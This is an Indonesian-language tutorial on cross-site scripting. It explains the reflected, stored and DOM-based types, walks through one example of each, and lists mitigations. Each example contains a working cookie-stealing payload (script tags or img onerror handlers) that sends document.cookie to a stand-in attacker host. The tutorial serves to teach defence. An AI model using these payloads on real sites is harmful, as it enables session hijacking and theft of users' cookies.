# Cross-Site Scripting (XSS)

## Definisi

Cross-Site Scripting (XSS) adalah jenis kerentanan keamanan pada aplikasi web, di mana penyerang dapat menyisipkan kode berbahaya (biasanya dalam bentuk JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain. Kerentanan ini terjadi ketika aplikasi web tidak memvalidasi atau membersihkan input pengguna dengan benar, sehingga skrip berbahaya dapat dieksekusi di browser pengguna.

![xss](https://www.indusface.com/wp-content/uploads/2018/11/Reflected-XSS-Attacks.png)

## Jenis XSS

1. Reflected XSS: script berbahaya dimasukkan ke dalam URL atau parameter permintaan HTTP dan kemudian "direfleksikan" kembali kepada pengguna dalam respon server.

2. Stored XSS: skrip berbahaya disimpan secara permanen di server dan dijalankan setiap kali pengguna mengakses halaman yang terpengaruh.

3. DOM-based XSS: skrip berbahaya berada pada client-side tanpa melibatkan server, skrip tersebut dieksekusi melalui perubahan langsung pada _Document Object Model_ (DOM) halaman website.

## Contoh Serangan

1. Reflected XSS

1. `Reflected XSS`

Sebuah aplikasi menampilkan pesan error kustom pada halaman login, di mana nama field yang gagal divalidasi ditampilkan kembali ke pengguna melalui parameter get bernama`field`.
 
Request normal:
```
https://example.com/login?field=email&error=required
```
 
Output pada halaman:
```html
<div class="alert">Field "email" wajib diisi.</div>
```
 
Karena nilai parameter `field` langsung disisipkan ke dalam halaman tanpa filter maupun encoding, penyerang dapat mengganti nilai tersebut dengan payload berbahaya, lalu mengirimkan link ini kepada korban (misalnya melalui email phishing):
 
```
https://example.com/login?field=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>&error=required
```
 
Output pada halaman korban:
```html
<div class="alert">Field "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>" wajib diisi.</div>
```
 
Ketika korban membuka link tersebut, script akan langsung dieksekusi oleh browser korban dan mengirimkan cookie sesi korban ke server milik penyerang, yang berpotensi digunakan untuk melakukan session hijacking.

2. Stored XSS

Semisal kita punya fitur untuk menampilkan komentar2 pengguna suatu aplikasi dan salah satu pesan nya seperti ini
```
Nopal Dapa gacor bug bounty $500 dolar!
```
 
Output yang ditampilkan ke semua pengunjung thread:
```html
<div class="comment">
    <span class="author">nopalngawixx</span>
    <p>Nopal Dapa gacor bug bounty $500 dolar!</p>
</div>
```
 
Karena tidak ada filter maupun sanitasi terhadap input komentar sebelum disimpan ke database, penyerang dapat mengirimkan komentar berisi payload berbahaya,
Contohnya menggunakan atribut `onerror` pada tag HTML img
 
```
menarik iki bolo <img src="x" onerror="new Image().src='https://attacker.com/log?c='+document.cookie">
```
 
Output yang tersimpan dan ditampilkan ke setiap pengunjung saat mengunjungi halaman tersebut:
```html
<div class="comment">
    <span class="author">hengkerhamdal89</span>
    <p>menarik iki bolo <img src="x" onerror="new Image().src='https://attacker.com/log?c='+document.cookie"></p>
</div>
```

3. DOM-based XSS


Misalkan ada sebuah halaman produk e-commerce menampilkan nama kategori yang sedang aktif menggunakan data dari fragment URL (`#`), 
yang diproses sepenuhnya di sisi client tanpa dikirim ke server:
 
```js
var hash = decodeURIComponent(window.location.hash.substring(1));
document.getElementById('categoryLabel').innerHTML = "Kategori: " + hash;
```

Dalam kasus request normal yang seharusnya dilakukan oleh pengguna:
```
https://example.com/products#Elektronik
```
 
Maka hasil render pada halaman akan menyesuaikan dengan query dari data fragment URL tersebut:
```html
<h2 id="categoryLabel">Kategori: Elektronik</h2>
```
 
Tapi, karena nilai `hash` diambil langsung dari URL dan disisipkan ke `innerHTML` tanpa sanitasi, penyerang dapat membuat link dengan payload berikut dan menyebarkannya kepada korban:
 
```
https://example.com/products#<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
```
 
Hasil render pada halaman korban:
```html
<h2 id="categoryLabel">Kategori: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)></h2>
```

## Mitigasi

1. Validasi semua input pengguna dengan hanya mengizinkan karakter dan format yang diharapkan
2. Menggunakan header CSP untuk membatasi resource yang dapat dijalankan oleh halaman web, contoh: hanya mengizinkan script dari sumber tertentu saja
3. Melakukan sanitasi data/input yang diterima dari pengguna sebelum diproses atau ditampilkan ke halaman web

## Referensi

1. https://portswigger.net/web-security/cross-site-scripting
2. https://owasp.org/www-community/attacks/xss/
